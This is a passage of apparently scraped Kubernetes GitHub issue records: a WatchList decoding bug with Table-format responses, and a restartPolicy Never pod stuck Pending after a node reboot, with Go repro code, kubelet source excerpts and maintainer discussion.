[`WarningsOnUpdate`](https://github.com/kubernetes/kubernetes/blob/fce5a08b9247b608c73cdeacde939c7e4951bce3/pkg/registry/resource/resourceslice/strategy.go#L90-L92) and [`WarningsOnCreate`](https://github.com/kubernetes/kubernetes/blob/fce5a08b9247b608c73cdeacde939c7e4951bce3/pkg/registry/resource/resourceslice/strategy.go#L63-L65) need to be implemented. You can probably find some other implementations to see what such warnings should look like.\n\nI think it's sufficient to warn for ResourceSlices. If a driver ignores the guidance and publishes a its slices with mixed or upper case driver name, then all downstream components like the scheduler have no choice and have to use that name. Sending a warning to them on e.g. a ResourceClaim status update with the driver name makes no sense.\n"}, {"author": "pohly", "body": "/assign @DanBokete "}, {"author": "pohly", "body": "/close\n\nSolved by https://github.com/kubernetes/kubernetes/pull/134185\n\nThanks @DanBokete !"}, {"author": "k8s-ci-robot", "body": "@pohly: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134131#issuecomment-3348341678):\n\n>/close\n>\n>Solved by https://github.com/kubernetes/kubernetes/pull/134185\n>\n>Thanks @DanBokete !\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 126206, "issue_url": "https://github.com/kubernetes/kubernetes/issues/126206", "issue_title": "WatchList failed when Accept content-type is Table", "issue_author": "xuzhenglun", "issue_body": "### What happened?\r\n\r\nWhen perform a List or WatchList with `Accept: application/json;as=Table;v=v1;g=meta.k8s.io`, api will convert every objects of response into `metav1.Table`. And as per the specification of the WatchList, a Bookmark event with `k8s.io/initial-events-end` should be sent after all initial events have been dispatched. Upon receiving this event, the client should close the watch and return the result.\r\n\r\nHowever, when response in Table format is returned, the annotations are placed on the `metav1.Table.Rows` instead of the top level of the object. This causes misbehavior in `client-go`.\r\n\r\n```\r\n# curl 'http://localhost:8888/api/v1/pods?allowWatchBookmarks=true&watch=true&sendInitialEvents=true&resourceVersionMatch=NotOlderThan' -H 'Accept: application/json;as=Table;v=v1;g=meta.k8s.io'\r\n...\r\n\r\n{\r\n  \"type\": \"BOOKMARK\",\r\n  \"object\": {\r\n    \"kind\": \"Table\",\r\n    \"apiVersion\": \"meta.k8s.io/v1\",\r\n    \"metadata\": {\r\n      \"resourceVersion\": \"457339\"\r\n    },\r\n    \"columnDefinitions\": null,\r\n    \"rows\": [\r\n      {\r\n        \"cells\": [\r\n          \"\",\r\n          \"0/0\",\r\n          \"\",\r\n          \"0\",\r\n          \"<unknown>\",\r\n          \"<none>\",\r\n          \"<none>\",\r\n          \"<none>\",\r\n          \"<none>\"\r\n        ],\r\n        \"object\": {\r\n          \"kind\": \"PartialObjectMetadata\",\r\n          \"apiVersion\": \"meta.k8s.io/v1\",\r\n          \"metadata\": {\r\n            \"resourceVersion\": \"457339\",\r\n            \"creationTimestamp\": null,\r\n            \"annotations\": {\r\n              \"k8s.io/initial-events-end\": \"true\"\r\n            }\r\n          }\r\n        }\r\n      }\r\n    ]\r\n  }\r\n}\r\n```\r\n\r\nIn the current implementation, an error `failed to parse watch event` will be thrown from `staging/src/k8s.io/client-go/rest/request.go:880`, and it will fall back to the standard List method.\r\n\r\n### What did you expect to happen?\r\n\r\nWatchList works properly.\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nIt can be reproduced by below go code. by runnint the code, a warning message like `W0719 01:33:52.152868   45522 simple.go:308] The watchlist request for /v1, Resource=pods ended with an error, falling back to the standard LIST semantics, err = failed to parse watch event: watch.Event{Type:\"ADDED\", Object:(*v1.Table)(0x14000694870)}` can be found in terminal.\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"fmt\"\r\n\t\"os\"\r\n\t\"path\"\r\n\t\"strings\"\r\n\r\n\tcorev1 \"k8s.io/api/core/v1\"\r\n\tmetav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\r\n\tmetav1beta1 \"k8s.io/apimachinery/pkg/apis/meta/v1beta1\"\r\n\t\"k8s.io/apimachinery/pkg/runtime/schema\"\r\n\t\"k8s.io/client-go/dynamic\"\r\n\t\"k8s.io/client-go/rest\"\r\n\t\"k8s.io/client-go/tools/clientcmd\"\r\n\t\"k8s.io/klog/v2\"\r\n\t\"k8s.io/kubectl/pkg/scheme\"\r\n)\r\n\r\nfunc main() {\r\n\thome, err := os.UserHomeDir()\r\n\tif err != nil {\r\n\t\tklog.Fatal(err)\r\n\t}\r\n\r\n\tcfg, err := clientcmd.BuildConfigFromFlags(\"\", path.Join(home, \".kube/config\"))\r\n\tif err != nil {\r\n\t\tklog.Fatal(err)\r\n\t}\r\n\r\n\tcfg.GroupVersion = &schema.GroupVersion{}\r\n\tcfg.AcceptContentTypes = strings.Join([]string{\r\n\t\tfmt.Sprintf(\"application/json;as=Table;v=%s;g=%s\", metav1.SchemeGroupVersion.Version, metav1.GroupName),\r\n\t\tfmt.Sprintf(\"application/json;as=Table;v=%s;g=%s\", metav1beta1.SchemeGroupVersion.Version, metav1beta1.GroupName),\r\n\t\t\"application/json\",\r\n\t}, \",\")\r\n\r\n\tgv := corev1.SchemeGroupVersion\r\n\tcfg.GroupVersion = &gv\r\n\tcfg.APIPath = \"/api\"\r\n\tcfg.NegotiatedSerializer = scheme.Codecs.WithoutConversion()\r\n\tcfg.UserAgent = rest.DefaultKubernetesUserAgent()\r\n\r\n\tclient, err := rest.RESTClientFor(cfg)\r\n\tif err != nil {\r\n\t\tklog.Fatal(err)\r\n\t}\r\n\r\n\tdynamicClient := dynamic.New(client)\r\n\tpods, err := dynamicClient.\r\n\t\tResource(corev1.SchemeGroupVersion.WithResource(\"pods\")).\r\n\t\tNamespace(\"kube-system\").\r\n\t\tList(context.TODO(), metav1.ListOptions{})\r\n\tif err != nil {\r\n\t\tklog.Fatal(err)\r\n\t}\r\n\tklog.Info(pods)\r\n}\r\n```\r\n\r\n### Anything else we need to know?\r\n\r\n_No response_\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\n$ kubectl version\r\nClient Version: v1.30.1\r\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\r\nServer Version: v1.31.0-beta.0.25+a70cb76847ada1-dirty\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/api-machinery", "needs-triage"], "comments": [{"author": "xuzhenglun", "body": "/sig api-machinery\r\n\r\ncc @p0lyn0mial"}, {"author": "xuzhenglun", "body": "I think this issus has some similarities with https://github.com/kubernetes/kubernetes/pull/126191. Both of these seem to be caused by differences in metadata between the List and the Singleton object."}, {"author": "xuzhenglun", "body": "friendly ping @p0lyn0mial \r\n\r\nIs this expected behavior on the apiserver side, leaving it up to the client to handle it appropriately?  WDYT @deads2k "}, {"author": "p0lyn0mial", "body": "It looks like the standard list request decoded the response successfully with the `Accept content-type` set as `Table`. Right? I assume that the decoded object was `UnstructuredList`.\r\n\r\nI think that the `WatchList` should also be able to decode successfully into `UnstructuredList` regardless of the requested encoding. If the requested encoding is unsupported, then the `WatchList` request could/should return an error.\r\n\r\n"}, {"author": "xuzhenglun", "body": "Thank @p0lyn0mial for reply.\r\n\r\nYes, the standard list returns `UnstructuredList` sucessfully when response is `Table`, and no error happened. Alrougth `Table` is not a list,  but `Unstructured` can do `ToList` method successfully, and the output is `&UnstructuredList{Object: obj.Object}` (field Items is nil in this case). However, `ListWatch` return an error for now, and the behavior of `List` and `WatchList` are different.\r\n\r\nI'm agree with you that `List` and `WatchList` should only support object can be decoded into `UnstructuredList`, but I'm not sure that if this difference can be considered as breaking compatibility?\r\n\r\nBeside of the encoding issue, the thing what I'm really worried about is the initial-end bookmark event is strange when response is a table: `metadata.annotation` is not available in the root of the object, but it's placed in `rows[0].object.metadata.annotation`. And the worst thing is that even `rows[0].object.metadata.annotation` can be unavailiable if `includeObject=None` param is set, since `rows[0].object` will be `nil`.\r\n\r\nI'm trying to add `WatchList` support for `kubectl`, so I was wondering if I could reuse the `WatchList` code in the `rest client` instead of implementing one myself. The `includeObject=None` parameter doesn't matter to me for what I'm doing, but I'm not sure if other people use it. So I wanted to ask your opinion on this."}, {"author": "p0lyn0mial", "body": "Since we are trying to replace `List` with `WatchList`, I think the new method should also be able to decode data, even if the response is a Table. \r\n\r\nI had to roll back the graduation of the feature, so it is turned off by default. Before enabling the feature we should consider fixing this issue.\r\n\r\nI don't think that placing the `initial-end bookmark annotation` on `rows[0].object` is specific to the `WatchList`. I believe this is where objects are generally placed when a user requests a Table. For example:\r\n\r\n```\r\n{\r\n  \"type\": \"ADDED\",\r\n  \"object\": {\r\n    \"kind\": \"Table\",\r\n    \"apiVersion\": \"meta.k8s.io/v1\",\r\n    \"metadata\": {\r\n      \"resourceVersion\": \"774\"\r\n    },\r\n    \"columnDefinitions\": null,\r\n    \"rows\": [\r\n      {\r\n        \"cells\": [\r\n          \"todo\",\r\n          1,\r\n          \"22s\"\r\n        ],\r\n        \"object\": {\r\n          \"kind\": \"PartialObjectMetadata\",\r\n          \"apiVersion\": \"meta.k8s.io/v1\",\r\n          \"metadata\": {\r\n            \"name\": \"todo\",\r\n            \"namespace\": \"example\",\r\n            \"uid\": \"2ea9e613-6487-406e-974a-42c6c7cf9a94\",\r\n            \"resourceVersion\": \"774\",\r\n            \"creationTimestamp\": \"2024-07-22T12:40:32Z\",\r\n            \"managedFields\": [\r\n              {\r\n                \"manager\": \"kubectl-create\",\r\n                \"operation\": \"Update\",\r\n                \"apiVersion\": \"v1\",\r\n                \"time\": \"2024-07-22T12:40:32Z\",\r\n                \"fieldsType\": \"FieldsV1\",\r\n                \"fieldsV1\": {\r\n                  \"f:data\": {\r\n                    \".\": {},\r\n                    \"f:foo\": {}\r\n                  }\r\n                }\r\n              }\r\n            ]\r\n          }\r\n        }\r\n      }\r\n    ]\r\n  }\r\n}\r\n```"}, {"author": "xuzhenglun", "body": "@p0lyn0mial \r\n\r\n> Since we are trying to replace List with WatchList, I think the new method should also be able to decode data, even if the response is a Table.\r\n\r\nSo, we will modify the implementation of `WatchList` method in `rest` package so that we can process Table normally, right?\r\n\r\n> I don't think that placing the initial-end bookmark annotation on rows[0].object is specific to the WatchList. I believe this is where objects are generally placed when a user requests a Table. \r\n\r\nYes, `initial-end bookmark annotation` is always placed in `rows[0].object` when requesting a Table. But there are two small problems when we are using `WatchList` with this behavior:\r\n\r\n1. `Table` need a special treatment likes below, and it looks weird. It's just a nit, no big deal.\r\n```patch\r\n+func metaAccessor(object runtime.Object) (metav1.Object, error) {\r\n+\ttable, ok := object.(*metav1.Table)\r\n+\tif ok {\r\n+\t\tif len(table.Rows) == 0 || len(table.Rows[0].Object.Raw) == 0 {\r\n+\t\t\treturn nil, fmt.Errorf(\"unexcept empty Table\")\r\n+\t\t}\r\n+\r\n+\t\tconverted, err := runtime.Decode(unstructured.UnstructuredJSONScheme, table.Rows[0].Object.Raw)\r\n+\t\tif err != nil {\r\n+\t\t\treturn nil, err\r\n+\t\t}\r\n+\r\n+\t\treturn meta.Accessor(converted)\r\n+\t}\r\n+\r\n+\treturn meta.Accessor(object)\r\n+}\r\n\r\n // handleWatchList holds the actual logic for easier unit testing.\r\n // Note that this function will close the passed watch.\r\n func (r *Request) handleWatchList(ctx context.Context, w watch.Interface) WatchListResult {\r\n \t\t\tif event.Type == watch.Error {\r\n \t\t\t\treturn WatchListResult{err: errors.FromObject(event.Object)}\r\n \t\t\t}\r\n-\t\t\tmeta, err := meta.Accessor(event.Object)\r\n+\t\t\tmeta, err := metaAccessor(event.Object)\r\n \t\t\tif err != nil {\r\n \t\t\t\treturn WatchListResult{err: fmt.Errorf(\"failed to parse watch event: %#v\", event)}\r\n \t\t\t}\r\n\r\n```\r\n\r\n2. If the WatchList request with `includeObject=None` params, the `initial-end bookmark annotation` will never been seen by client. I'm not sure if we can accept that it's just not supported. For example, the bookmark event will looks like:\r\n```json\r\n{\r\n  \"type\": \"BOOKMARK\",\r\n  \"object\": {\r\n    \"kind\": \"Table\",\r\n    \"apiVersion\": \"meta.k8s.io/v1\",\r\n    \"metadata\": {\r\n      \"resourceVersion\": \"679930\"\r\n    },\r\n    \"columnDefinitions\": null,\r\n    \"rows\": [\r\n      {\r\n        \"cells\": [\r\n          \"\",\r\n          \"0/0\",\r\n          \"\",\r\n          \"0\",\r\n          \"<unknown>\",\r\n          \"<none>\",\r\n          \"<none>\",\r\n          \"<none>\",\r\n          \"<none>\"\r\n        ],\r\n        \"object\": null\r\n      }\r\n    ]\r\n  }\r\n}\r\n```\r\n\r\n"}, {"author": "xuzhenglun", "body": "@p0lyn0mial \r\n\r\nI just submited a PR  https://github.com/kubernetes/kubernetes/pull/126363 which trying to address this issue. Would you please take a look? I'm not sure is it good enough since I'm really new to this part of code."}, {"author": "cici37", "body": "/triage accepted"}, {"author": "wojtek-t", "body": "/cc"}, {"author": "p0lyn0mial", "body": "@xuzhenglun FYI We have decided to temporarily return a 406 for watchlist requests that require `application/json;as=Table` (https://github.com/kubernetes/kubernetes/pull/126996). We will resolve this issue before promoting the watchlist feature to GA."}, {"author": "xuzhenglun", "body": "> @xuzhenglun FYI We have decided to temporarily return a 406 for watchlist requests that require `application/json;as=Table` (#126996). We will resolve this issue before promoting the watchlist feature to GA.\r\n\r\nWell, does any thought about how to deal with that in future or any detail about where the difficulty is? I\u2019m glad to devoted myself to that to accelerate It if I may. "}, {"author": "p0lyn0mial", "body": "> Well, does any thought about how to deal with that in future or any detail about where the difficulty is? I\u2019m glad to devoted myself to that to accelerate It if I may.\r\n\r\nSure, feel free to work on it. Please take a look at https://github.com/kubernetes/kubernetes/pull/126996. We just don't want to block the WatchList on this issue. We would like to promote it to Beta this release."}, {"author": "xuzhenglun", "body": "> #126996\r\n\r\nThanks, I will take a look that and try to sort it out.  "}, {"author": "p0lyn0mial", "body": "> Thanks, I will take a look that and try to sort it out.\r\n\r\nyw, also please take a look at \r\nhttps://github.com/kubernetes/kubernetes/pull/127587/files#diff-12e0758457373aa860bb0baae0878a99c107840d25fcf356d126d4b3d1d15663R581. Especially the place that transforms the object to `PartialObjectMetadataList`. Maybe we need something similar. Try experimenting. "}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "wojtek-t", "body": "This has been fixed with https://github.com/kubernetes/kubernetes/pull/132817"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 118321, "issue_url": "https://github.com/kubernetes/kubernetes/issues/118321", "issue_title": "pod(restartPolicy == Never) stuck pending when vm reboot", "issue_author": "Dingshujie", "issue_body": "### What happened?\n\n1. create a job, set job restartPolicy to Never;\r\n``` yaml\r\napiVersion: batch/v1\r\nkind: Job\r\nmetadata:\r\n  annotations:\r\n    description: ''\r\n  enable: true\r\n  name: test-created\r\n  namespace: default\r\n  lables: {}\r\nspec:\r\n  completions: 1\r\n  parallelism: 1\r\n  activeDeadlineSeconds: null\r\n  template:\r\n    metadata:\r\n      enable: true\r\n      name: test-created\r\n      labels:\r\n        app: test-created\r\n        version: v1\r\n    spec:\r\n      containers:\r\n        - name: container-1\r\n          image: ubuntu:xenial-20190610\r\n          imagePullPolicy: IfNotPresent\r\n          command:\r\n            - /bin/bash\r\n            - '-c'\r\n            - sleep 60\r\n          resources: {}\r\n      imagePullSecrets:\r\n        - name: default-secret\r\n      restartPolicy: Never\r\n      volumes: []\r\n      dnsConfig:\r\n        options:\r\n          - name: single-request-reopen\r\n      initContainers: []\r\n  completionMode: NonIndexed\r\n```\r\n2. pod scheduled to Node A, and Node A reboot\uff0cafter reboot, pod stuck pending state\r\n\r\nsee kubelet log, only see \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"default/test-created-w2bk5\"\r\nafter code review, if reboot occur when ```the container created success, but it is not started```, may lead this problem;\r\n\r\n2.1 after reboot, pod's sandbox exit, so PodSandboxChanged return true, and new attemp count set to one, and kubelet log \"o ready sandbox for pod can be found. Need to start a new one\" can confirm this.\r\n``` go\r\n// PodSandboxChanged checks whether the spec of the pod is changed and returns\r\n// (changed, new attempt, original sandboxID if exist).\r\nfunc PodSandboxChanged(pod *v1.Pod, podStatus *kubecontainer.PodStatus) (bool, uint32, string) {\r\n\tif len(podStatus.SandboxStatuses) == 0 {\r\n\t\tklog.V(2).InfoS(\"No sandbox for pod can be found. Need to start a new one\", \"pod\", klog.KObj(pod))\r\n\t\treturn true, 0, \"\"\r\n\t}\r\n\r\n\treadySandboxCount := 0\r\n\tfor _, s := range podStatus.SandboxStatuses {\r\n\t\tif s.State == runtimeapi.PodSandboxState_SANDBOX_READY {\r\n\t\t\treadySandboxCount++\r\n\t\t}\r\n\t}\r\n\r\n\t// Needs to create a new sandbox when readySandboxCount > 1 or the ready sandbox is not the latest one.\r\n\tsandboxStatus := podStatus.SandboxStatuses[0]\r\n\tif readySandboxCount > 1 {\r\n\t\tklog.V(2).InfoS(\"Multiple sandboxes are ready for Pod. Need to reconcile them\", \"pod\", klog.KObj(pod))\r\n\t\treturn true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id\r\n\t}\r\n\tif sandboxStatus.State != runtimeapi.PodSandboxState_SANDBOX_READY {\r\n\t\tklog.V(2).InfoS(\"No ready sandbox for pod can be found. Need to start a new one\", \"pod\", klog.KObj(pod))\r\n\t\treturn true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id\r\n\t}\r\n\r\n\t// Needs to create a new sandbox when network namespace changed.\r\n\tif sandboxStatus.GetLinux().GetNamespaces().GetOptions().GetNetwork() != NetworkNamespaceForPod(pod) {\r\n\t\tklog.V(2).InfoS(\"Sandbox for pod has changed. Need to start a new one\", \"pod\", klog.KObj(pod))\r\n\t\treturn true, sandboxStatus.Metadata.Attempt + 1, \"\"\r\n\t}\r\n\r\n\t// Needs to create a new sandbox when the sandbox does not have an IP address.\r\n\tif !kubecontainer.IsHostNetworkPod(pod) && sandboxStatus.Network != nil && sandboxStatus.Network.Ip == \"\" {\r\n\t\tklog.V(2).InfoS(\"Sandbox for pod has no IP address. Need to start a new one\", \"pod\", klog.KObj(pod))\r\n\t\treturn true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id\r\n\t}\r\n\r\n\treturn false, sandboxStatus.Metadata.Attempt, sandboxStatus.Id\r\n}\r\n```\r\n\r\n2.2 after reboot, kubelet got containerstatus from cri, container in ContainerStateCreated state( indicates a container that has been created (e.g. with docker create) but not started.), now kubelet think on this scene, kubelet should not create a sandbox for a pod it it already done; but container only created not started, we should recover this pod?\r\n``` go\r\n\t// If we need to (re-)create the pod sandbox, everything will need to be\r\n\t// killed and recreated, and init containers should be purged.\r\n\tif createPodSandbox {\r\n\t\tif !shouldRestartOnFailure(pod) && attempt != 0 && len(podStatus.ContainerStatuses) != 0 {\r\n\t\t\t// Should not restart the pod, just return.\r\n\t\t\t// we should not create a sandbox for a pod if it is already done.\r\n\t\t\t// if all containers are done and should not be started, there is no need to create a new sandbox.\r\n\t\t\t// this stops confusing logs on pods whose containers all have exit codes, but we recreate a sandbox before terminating it.\r\n\t\t\t//\r\n\t\t\t// If ContainerStatuses is empty, we assume that we've never\r\n\t\t\t// successfully created any containers. In this case, we should\r\n\t\t\t// retry creating the sandbox.\r\n\t\t\tchanges.CreateSandbox = false\r\n\t\t\treturn changes\r\n\t\t}\r\n\r\n\t\t// Get the containers to start, excluding the ones that succeeded if RestartPolicy is OnFailure.\r\n\t\tvar containersToStart []int\r\n\t\tfor idx, c := range pod.Spec.Containers {\r\n\t\t\tif pod.Spec.RestartPolicy == v1.RestartPolicyOnFailure && containerSucceeded(&c, podStatus) {\r\n\t\t\t\tcontinue\r\n\t\t\t}\r\n\t\t\tcontainersToStart = append(containersToStart, idx)\r\n\t\t}\r\n\t\t// We should not create a sandbox for a Pod if initialization is done and there is no container to start.\r\n\t\tif len(containersToStart) == 0 {\r\n\t\t\t_, _, done := findNextInitContainerToRun(pod, podStatus)\r\n\t\t\tif done {\r\n\t\t\t\tchanges.CreateSandbox = false\r\n\t\t\t\treturn changes\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif len(pod.Spec.InitContainers) != 0 {\r\n\t\t\t// Pod has init containers, return the first one.\r\n\t\t\tchanges.NextInitContainerToStart = &pod.Spec.InitContainers[0]\r\n\t\t\treturn changes\r\n\t\t}\r\n\t\tchanges.ContainersToStart = containersToStart\r\n\t\treturn changes\r\n\t}\r\n```\r\n3.3 kubelet generate container status, kubecontainer.ContainerStateCreated will convert to ContainerStateWaiting(this introduce by [kubelet: If the container status is created, we are waiting](https://github.com/kubernetes/kubernetes/pull/107845) ), and ContainerStateWaiting may lead pod phase to be Pending, \r\n``` go\r\n\tconvertContainerStatus := func(cs *kubecontainer.Status, oldStatus *v1.ContainerStatus) *v1.ContainerStatus {\r\n\t\tcid := cs.ID.String()\r\n\t\tstatus := &v1.ContainerStatus{\r\n\t\t\tName:         cs.Name,\r\n\t\t\tRestartCount: int32(cs.RestartCount),\r\n\t\t\tImage:        cs.Image,\r\n\t\t\tImageID:      cs.ImageID,\r\n\t\t\tContainerID:  cid,\r\n\t\t}\r\n\t\tswitch {\r\n\t\tcase cs.State == kubecontainer.ContainerStateRunning:\r\n\t\t\tstatus.State.Running = &v1.ContainerStateRunning{StartedAt: metav1.NewTime(cs.StartedAt)}\r\n\t\tcase cs.State == kubecontainer.ContainerStateCreated:\r\n\t\t\t// containers that are created but not running are \"waiting to be running\"\r\n\t\t\tstatus.State.Waiting = &v1.ContainerStateWaiting{}\r\n\t\tcase cs.State == kubecontainer.ContainerStateExited:\r\n\t\t\tstatus.State.Terminated = &v1.ContainerStateTerminated{\r\n\t\t\t\tExitCode:    int32(cs.ExitCode),\r\n\t\t\t\tReason:      cs.Reason,\r\n\t\t\t\tMessage:     cs.Message,\r\n\t\t\t\tStartedAt:   metav1.NewTime(cs.StartedAt),\r\n\t\t\t\tFinishedAt:  metav1.NewTime(cs.FinishedAt),\r\n\t\t\t\tContainerID: cid,\r\n\t\t\t}\r\n\r\n\t\tcase cs.State == kubecontainer.ContainerStateUnknown &&\r\n\t\t\toldStatus != nil && // we have an old status\r\n\t\t\toldStatus.State.Running != nil: // our previous status was running\r\n\t\t\t// if this happens, then we know that this container was previously running and isn't anymore (assuming the CRI isn't failing to return running containers).\r\n\t\t\t// you can imagine this happening in cases where a container failed and the kubelet didn't ask about it in time to see the result.\r\n\t\t\t// in this case, the container should not to into waiting state immediately because that can make cases like runonce pods actually run\r\n\t\t\t// twice. \"container never ran\" is different than \"container ran and failed\".  This is handled differently in the kubelet\r\n\t\t\t// and it is handled differently in higher order logic like crashloop detection and handling\r\n\t\t\tstatus.State.Terminated = &v1.ContainerStateTerminated{\r\n\t\t\t\tReason:   \"ContainerStatusUnknown\",\r\n\t\t\t\tMessage:  \"The container could not be located when the pod was terminated\",\r\n\t\t\t\tExitCode: 137, // this code indicates an error\r\n\t\t\t}\r\n\t\t\t// the restart count normally comes from the CRI (see near the top of this method), but since this is being added explicitly\r\n\t\t\t// for the case where the CRI did not return a status, we need to manually increment the restart count to be accurate.\r\n\t\t\tstatus.RestartCount = oldStatus.RestartCount + 1\r\n\r\n\t\tdefault:\r\n\t\t\t// this collapses any unknown state to container waiting.  If any container is waiting, then the pod status moves to pending even if it is running.\r\n\t\t\t// if I'm reading this correctly, then any failure to read status on any container results in the entire pod going pending even if the containers\r\n\t\t\t// are actually running.\r\n\t\t\t// see https://github.com/kubernetes/kubernetes/blob/5d1b3e26af73dde33ecb6a3e69fb5876ceab192f/pkg/kubelet/kuberuntime/kuberuntime_container.go#L497 to\r\n\t\t\t// https://github.com/kubernetes/kubernetes/blob/8976e3620f8963e72084971d9d4decbd026bf49f/pkg/kubelet/kuberuntime/helpers.go#L58-L71\r\n\t\t\t// and interpreted here https://github.com/kubernetes/kubernetes/blob/b27e78f590a0d43e4a23ca3b2bf1739ca4c6e109/pkg/kubelet/kubelet_pods.go#L1434-L1439\r\n\t\t\tstatus.State.Waiting = &v1.ContainerStateWaiting{}\r\n\t\t}\r\n\t\treturn status\r\n\t}\r\n```\r\n\r\n\r\n\r\n\n\n### What did you expect to happen?\n\npod change to Final State(Succeed or Failed)\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n\r\n1. add some fake code to kubelet to simulator this scene\r\n``` go\r\nif strings.Contains(pod.Name, \"test-created\") {\r\n               if _, err := m.osInterface.Stat(\"/var/lib/kubelet/test-created\"); os.IsNotExist(err) {\r\n                       klog.V(2).InfoS(\"==== restart kubelet\")\r\n                       m.osInterface.Create(\"/var/lib/kubelet/test-created\")\r\n                       err = m.runtimeService.StopPodSandbox(podSandboxID)\r\n                       if err != nil {\r\n                               klog.ErrorS(err, \"== StopPodSandbox failed\", \"sandboxid\", podSandboxID)\r\n                       }\r\n                       klog.V(2).InfoS(\"=== touch file\")\r\n                       klog.Fatalf(\"=== panic\")\r\n               }\r\n       }\r\n\r\n```\r\n2. create job named test-created set restart policy to Never\r\n3. see pod status stuck in pending, can not recover\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\n$ kubectl version\r\n# paste output here\r\n```\r\n\r\n</details>\r\n1.25\n\n### Cloud provider\n\n<details>\r\n\r\n</details>\r\nHuawei Cloud\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\nUbuntu\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/node", "triage/needs-information"], "comments": [{"author": "Dingshujie", "body": "/sig node"}, {"author": "Dingshujie", "body": "@ehashman @SergeyKanzhelev"}, {"author": "SergeyKanzhelev", "body": "/cc @ffromani "}, {"author": "SergeyKanzhelev", "body": "/cc @mimowo @xmcqueen \r\n\r\n/triage accepted\r\n\r\nLooks like the issue has enough details for a repro."}, {"author": "SergeyKanzhelev", "body": "/priority important-longerm\r\n\r\nDoesn't sound like a regression."}, {"author": "k8s-ci-robot", "body": "@SergeyKanzhelev: The label(s) `priority/important-longerm` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/118321#issuecomment-1570621606):\n\n>/priority important-longerm\r\n>\r\n>Doesn't sound like a regression.\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "mimowo", "body": "@Dingshujie can you reproduce this issue on 1.27? Not sure this would help, but I'm asking cause there have been a couple of fixes to pod lifecycle in 1.27, including https://github.com/kubernetes/kubernetes/pull/115331."}, {"author": "tuibeovince", "body": "@Dingshujie  I tried reproducing the problem in `v1.29.0` and the pod doesn't seem to get stuck in `Pending` anymore; but does this resolve your current problem?\r\n\r\n1. Using the job config yaml in the issue description; I created a job in a single worker node cluster \r\n```\r\n# kubectl get no,po -o wide\r\nNAME                             STATUS     ROLES           AGE   VERSION   INTERNAL-IP       EXTERNAL-IP   OS-IMAGE          KERNEL-VERSION          CONTAINER-RUNTIME\r\nnode/localhost.localdomain       Ready      control-plane   47m   v1.29.0   XXX.XXX.XXX.XXX   <none>        CentOS Stream 8   4.18.0-544.el8.x86_64   containerd://1.6.28\r\nnode/localmachine2.localdomain   Ready      <none>          45m   v1.29.0   XXX.XXX.XXX.XXX   <none>        CentOS Stream 8   4.18.0-544.el8.x86_64   containerd://1.6.28\r\n\r\nNAME                     READY   STATUS    RESTARTS   AGE   IP            NODE                        NOMINATED NODE   READINESS GATES\r\npod/test-created-2mfq7   1/1     Running   0          6s    10.244.1.33   localmachine2.localdomain   <none>           <none>\r\n```\r\n\r\n2.a [With Graceful Node Shutdown enabled] After rebooting the worker node; and waiting for a while, the old pod ends up in an `Error` and starts a new pod which ends up `Completed`. Zero Restarts.\r\n\r\n```\r\nNAME                     READY   STATUS      RESTARTS   AGE     IP            NODE                        NOMINATED NODE   READINESS GATES\r\npod/test-created-2mfq7   0/1     Error       0          10m     <none>        localmachine2.localdomain   <none>           <none>\r\npod/test-created-5g5cc   0/1     Completed   0          9m22s   10.244.1.34   localmachine2.localdomain   <none>           <none>\r\n```\r\n\r\n2.b [Without 